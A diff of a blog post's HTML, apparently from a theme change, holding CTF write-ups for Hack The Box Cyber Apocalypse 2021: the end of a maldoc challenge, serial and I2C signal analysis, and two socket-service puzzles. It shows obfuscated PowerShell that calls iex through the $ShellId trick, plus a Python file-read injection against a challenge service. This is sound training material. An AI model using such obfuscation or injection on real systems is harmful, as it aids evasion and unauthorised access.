         <span style=color:#e6db74>&#39;&#39;</span> , (<span style=color:#66d9ef>[REGeX]</span>::MaTCHES( <span style=color:#e6db74>&#34;)&#39;x&#39;+]31[DIlLeHs$+]1[DiLLehs$ (&amp;| )43]RAhc[]GnIRTs[,&#39;tXj&#39;(eCALPER.)&#39;$&#39;,&#39;wqi&#39;(eCALPER.)&#39;;tX&#39;+&#39;jera_scodlam&#39;+&#39;{B&#39;+&#39;T&#39;+&#39;HCtXj &#39;+&#39;= p&#39;+&#39;gerwqi&#39;(&#34;</span> ,<span style=color:#e6db74>&#39;.&#39;</span> ,<span style=color:#e6db74>&#39;R&#39;</span>+<span style=color:#e6db74>&#39;iGHTtOl&#39;</span>+<span style=color:#e6db74>&#39;eft&#39;</span>
     ) | FoREaCH-OBJecT {$_.VALUE} ))
-</code></pre></div>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/invitation_1.png>
+</code></pre></div><figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/invitation_1.png>
 </figure>
 <p>That resulted in:</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell>(<span style=color:#e6db74>&#39;iqwreg&#39;</span>+<span style=color:#e6db74>&#39;p =&#39;</span>+<span style=color:#e6db74>&#39; jXtCH&#39;</span>+<span style=color:#e6db74>&#39;T&#39;</span>+<span style=color:#e6db74>&#39;B{&#39;</span>+<span style=color:#e6db74>&#39;maldocs_arej&#39;</span>+<span style=color:#e6db74>&#39;Xt;&#39;</span>).REPLACe(<span style=color:#e6db74>&#39;iqw&#39;</span>,<span style=color:#e6db74>&#39;$&#39;</span>).REPLACe(<span style=color:#e6db74>&#39;jXt&#39;</span>,<span style=color:#66d9ef>[sTRInG][chAR]</span>34) |&amp;( $sheLLiD[1]+$sHeLlID[13]+<span style=color:#e6db74>&#39;x&#39;</span>)
 </code></pre></div><p>If you look closely, you should spot a part of the flag as <code>CHTB{maldocs_are</code>. Notice the calls to <code>replace()</code> which make it more obvious. The second interesting statement I mentioned, you should see a part of the flag that is reversed: <code>'}atem_we'+'n_eht'+'</code>. Reverse by hand and put them together to get the flag.</p>
 <p>Flag: <code>CHTB{maldocs_are_the_new_meta}</code></p>
-<h2 id=category---hardware>category - Hardware</h2>
-<h3 id=--serial-logs>- Serial Logs</h3>
+<h2 id=category---hardware>category - Hardware<a hidden class=anchor aria-hidden=true href=#category---hardware>#</a></h2>
+<h3 id=--serial-logs>- Serial Logs<a hidden class=anchor aria-hidden=true href=#--serial-logs>#</a></h3>
 <ul>
 <li>Category: Hardware</li>
 <li>Difficulty: 1/4</li>
 <li>Files: .sal file</li>
 </ul>
 <p>After figuring out what a .sal file was, I downloaded the Windows Logic Analyzer software from Saleae <a href=https://www.saleae.com/downloads/>here</a>. Open up the .sal file and you&rsquo;d see a waveform of sorts. It took a bit of time to figure out how to use Logic2 application, but eventually I got to the point where I added a Async Serial Analyzer and chose 115200 as the bit rate (a guess).</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/serial_logs_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/serial_logs_1.png>
 </figure>
 <p>In the terminal view you could see some clear text &ldquo;logs&rdquo;, with the last readable entry saying that the baud rate has changed, followed by gibberish.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/serial_logs_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/serial_logs_2.png>
 </figure>
 <p>With a clear hint that the baud rate changed, the next step was to figure out what the new baud rate was. Looking at the waveform zoomed out pretty far you could see the collapsed pulses being visually different together with the ASCII representation of the bytes Logic2 shows.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/serial_logs_3.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/serial_logs_3.png>
 </figure>
 <p>Calculating baud is something I have struggled with before in <a href=https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/>previous work</a>. This time though I came across a really good post helping clear up some of the math <a href=https://electronics.stackexchange.com/questions/273816/how-to-calculate-baud-rate-and-determine-the-number-of-stop-bits-in-asynchronous>here</a>. The TL;DR is that the formula to use to calculate the baud rate is <code>1/(smallest 1/0 time) / 10e-6</code>. If we look at the waveform at two different times, one where the known baud is 115200 and another time where the new baud is used, you can see the pulse timing being clearly different.</p>
 <p>115200 baud</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/serial_logs_4.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/serial_logs_4.png>
 </figure>
 <p>Unknown baud</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/serial_logs_5.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/serial_logs_5.png>
 </figure>
 <p>To test the formula, I tried to see if I can get to 115200. The shortest pulse I could find was 8.48us.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&gt;&gt;&gt; 1/(8.48*10e-6)
@@ -897,46 +924,46 @@ Connection: close
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>&gt;&gt;&gt; 1/(13.46*10e-7)
 74294.20505200594
 </code></pre></div><p>Updating the Async Serial analyser with a new baud rate of 74294, we see the terminal now showing the original log entries we could see as gibberish, but the new ones in printable ASCII revealing the flag.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/serial_logs_6.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/serial_logs_6.png>
 </figure>
 <p>Flag: <code>CHTB{wh47?!_f23qu3ncy_h0pp1n9_1n_4_532141_p2070c01?!!!52}</code></p>
-<h3 id=--compromised>- Compromised</h3>
+<h3 id=--compromised>- Compromised<a hidden class=anchor aria-hidden=true href=#--compromised>#</a></h3>
 <ul>
 <li>Category: Hardware</li>
 <li>Difficulty: 1/4</li>
 <li>Files: .sal file</li>
 </ul>
 <p>Another sal file, this time with data in two channels. I looked for analysers that accepted two channels and found the I2C analyser.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/compromised_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/compromised_1.png>
 </figure>
 <p>The resultant data table showed many ASCII printable characters, so I figured I at least had the right analyser chosen. I exported the data to the clipboard and pasted it into a text file for further processing.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/compromised_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/compromised_2.png>
 </figure>
 <p>A closer look showed that the data had a start/stop sequence, writing one byte at a time. You also could see this when you zoomed the analysed wave form.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/compromised_3.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/compromised_3.png>
 </figure>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/compromised_4.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/compromised_4.png>
 </figure>
 <p>The raw data also had an address instruction, which was either <code>4</code> or <code>,</code>. Knowing the flag format, we could see that when the <code>,</code> address is used, valid characters are written. A simple grep on that extracted data where the <code>,</code> address is used reveals the flag.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/compromised_5.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/compromised_5.png>
 </figure>
 <p>Flag: <code>CHTB{nu11_732m1n47025_c4n_8234k_4_532141_5y573m!@52)#@%}</code></p>
-<h2 id=category---misc>category - Misc</h2>
-<h3 id=--alien-camp>- Alien Camp</h3>
+<h2 id=category---misc>category - Misc<a hidden class=anchor aria-hidden=true href=#category---misc>#</a></h2>
+<h3 id=--alien-camp>- Alien Camp<a hidden class=anchor aria-hidden=true href=#--alien-camp>#</a></h3>
 <ul>
 <li>Category: Misc</li>
 <li>Difficulty: 1/4</li>
 <li>Files: None</li>
 </ul>
 <p>A socket service hosted a calculator game, driven by emojis. Sending 1 would send an emoji value reference that changed every time you connected to the socket service. Using this reference, you had to solve 500 math questions in less than 2 seconds or something, each. Obviously something we have to script!</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/alien_camp_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/alien_camp_1.png>
 </figure>
 <p>My script has two parts. First, request the value map, parse and save that. Next, start the game, parse the question by replacing the emojis with the parsed integers and then <code>eval()</code> that.</p>
 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
@@ -1026,57 +1053,70 @@ ev <span style=color:#f92672>=</span> [] <span style=color:#75715e># emoji value
     <span style=color:#75715e># get our flag</span>
     conn<span style=color:#f92672>.</span>interactive()
 </code></pre></div><p>The final moments of the script running looked like this.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/alien_camp_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/alien_camp_2.png>
 </figure>
 <p>Flag: <code>CHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}</code></p>
-<h3 id=--input-as-a-service>- Input as a Service</h3>
+<h3 id=--input-as-a-service>- Input as a Service<a hidden class=anchor aria-hidden=true href=#--input-as-a-service>#</a></h3>
 <ul>
 <li>Category: Misc</li>
 <li>Difficulty: 1/4</li>
 <li>Files: None</li>
 </ul>
 <p>We get another socket service, but I wasted a bunch of time by browsing to it&mldr; lol.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/input_as_a_service_1.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/input_as_a_service_1.png>
 </figure>
 <p>Anyways, rabbit hole aside, it looked like some sort of python interpreter over a TCP socket. Maybe not exactly a python interpreter, but you could do some interesting things like read files.</p>
-<figure class=left>
-<img src=/images/htbcyperapocalypse21/input_as_a_service_2.png>
+<figure>
+<img loading=lazy src=/images/htbcyperapocalypse21/input_as_a_service_2.png>
 </figure>
 <p>To get the flag. just <code>open('flag.txt').read()</code>.</p>
 <p>Flag: <code>CHTB{4li3n5_us3_pyth0n2.X?!</code></p>
 </div>
-<div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Read other posts</span>
-<hr>
-</div>
-<div class=pagination__buttons>
-<span class="button previous">
-<a href=https://leonjza.github.io/blog/2021/05/09/dawgctf-2021/>
-<span class=button__icon>←</span>
-<span class=button__text>DawgCTF 2021</span>
+<footer class=post-footer>
+<nav class=paginav>
+<a class=prev href=https://leonjza.github.io/blog/2021/05/09/dawgctf-2021/>
+<span class=title>« Prev Page</span>
+<br>
+<span>DawgCTF 2021</span>
 </a>
-</span>
-<span class="button next">
-<a href=https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-iot-itchy-scratchy-secureiot-co/>
-<span class=button__text>NahamCon2021 CTF - IoT Itchy & Scratchy SecureIoT Co</span>
-<span class=button__icon>→</span>
+<a class=next href=https://leonjza.github.io/blog/2021/03/15/nahamcon2021-ctf-iot-itchy-scratchy-secureiot-co/>
+<span class=title>Next Page »</span>
+<br>
+<span>NahamCon2021 CTF - IoT Itchy & Scratchy SecureIoT Co</span>
 </a>
-</span>
-</div>
-</div>
-</div>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share hack the box - cyber apocalypse ctf '21 on twitter" href="https://twitter.com/intent/tweet/?text=hack%20the%20box%20-%20cyber%20apocalypse%20ctf%20%2721&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f04%2f24%2fhack-the-box-cyber-apocalypse-ctf-21%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hack the box - cyber apocalypse ctf '21 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f04%2f24%2fhack-the-box-cyber-apocalypse-ctf-21%2f&title=hack%20the%20box%20-%20cyber%20apocalypse%20ctf%20%2721&summary=hack%20the%20box%20-%20cyber%20apocalypse%20ctf%20%2721&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f04%2f24%2fhack-the-box-cyber-apocalypse-ctf-21%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hack the box - cyber apocalypse ctf '21 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f04%2f24%2fhack-the-box-cyber-apocalypse-ctf-21%2f&title=hack%20the%20box%20-%20cyber%20apocalypse%20ctf%20%2721"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hack the box - cyber apocalypse ctf '21 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f04%2f24%2fhack-the-box-cyber-apocalypse-ctf-21%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hack the box - cyber apocalypse ctf '21 on whatsapp" href="https://api.whatsapp.com/send?text=hack%20the%20box%20-%20cyber%20apocalypse%20ctf%20%2721%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f04%2f24%2fhack-the-box-cyber-apocalypse-ctf-21%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share hack the box - cyber apocalypse ctf '21 on telegram" href="https://telegram.me/share/url?text=hack%20the%20box%20-%20cyber%20apocalypse%20ctf%20%2721&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2021%2f04%2f24%2fhack-the-box-cyber-apocalypse-ctf-21%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
 </div>
 </footer>
-<script src=https://leonjza.github.io/assets/main.js></script>
-<script src=https://leonjza.github.io/assets/prism.js></script>
-</div>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
+</article>
+</main>
+<footer class=footer>
+<span>@leonjza</span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
 </body>
 </html>
